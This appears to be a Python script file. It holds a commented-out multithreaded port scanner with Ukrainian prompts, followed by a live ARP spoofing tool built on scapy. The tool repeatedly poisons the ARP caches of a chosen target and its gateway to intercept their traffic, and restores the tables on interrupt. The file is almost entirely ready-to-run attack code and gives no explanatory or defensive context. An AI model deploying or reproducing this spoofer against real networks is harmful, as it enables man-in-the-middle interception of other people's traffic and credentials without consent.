# import socket
# import re
# import concurrent.futures
#
# # Регулярні вирази для перевірки IP-адреси та діапазону портів
# ip_pattern = re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
# port_range_pattern = re.compile(r"(\d+)-(\d+)")
# open_ports = []
#
# # Функція для перевірки порту
# def check_port(ip, port):
#     try:
#         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
#             s.settimeout(1)  # Тайм-аут для кожного підключення
#             s.connect((ip, port))
#             return port  # Порт відкритий
#     except (socket.timeout, socket.error):
#         return None  # Порт закритий
#
# # Запит IP-адреси для сканування
# while True:
#     ip_address = input("Будь ласка, введіть IP-адресу для сканування: ")
#     if ip_pattern.match(ip_address):
#         print(f"{ip_address} є дійсною IP-адресою.")
#         break
#     else:
#         print("Невірна IP-адреса. Будь ласка, спробуйте ще раз.")
#
# # Запит діапазону портів
# while True:
#     port_range = input("Введіть діапазон портів від 1 до 65535 (наприклад, 100-200): ").replace(" ", "")
#     port_range_match = port_range_pattern.match(port_range)
#     if port_range_match:
#         port_start = int(port_range_match.group(1))
#         port_end = int(port_range_match.group(2))
#         if 0 <= port_start <= port_end <= 65535:
#             break
#         else:
#             print("Діапазон портів має бути між 0 і 65535. Будь ласка, спробуйте ще раз.")
#     else:
#         print("Невірний формат діапазону портів. Будь ласка, спробуйте ще раз.")
#
# print(f"\nСканування IP: {ip_address} на портах {port_start}-{port_end}...\n")
#
# # Мультитрединг для паралельного сканування портів
# with concurrent.futures.ThreadPoolExecutor() as executor:
#     results = executor.map(lambda port: check_port(ip_address, port), range(port_start, port_end + 1))
#
# # Виведення результатів
# for port in results:
#     if port is not None:
#         open_ports.append(port)
#
# # Виведення результатів
# if open_ports:
#     print(f"\nВідкриті порти на {ip_address}:")
#     for port in open_ports:
#         print(f"Порт {port} відкритий.")
# else:
#     print(f"\nНе знайдено відкритих портів на {ip_address}.")


#!/usr/bin/python

import scapy.all as scapy
import time

interval = 4
ip_target = input("Enter target IP address: ")
ip_gateway = input("Enter gateway IP address: ")

def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=scapy.getmacbyip(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = scapy.getmacbyip(destination_ip)
    source_mac = scapy.getmacbyip(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)

try:
    while True:
        spoof(ip_target, ip_gateway)
        spoof(ip_gateway, ip_target)
        time.sleep(interval)
except KeyboardInterrupt:
    restore(ip_gateway, ip_target)
    restore(ip_target, ip_gateway)


# target_ip = "192.168.0.106"  # Enter your target IP
# gateway_ip = "192.168.0.1"  # Enter your gateway's IP
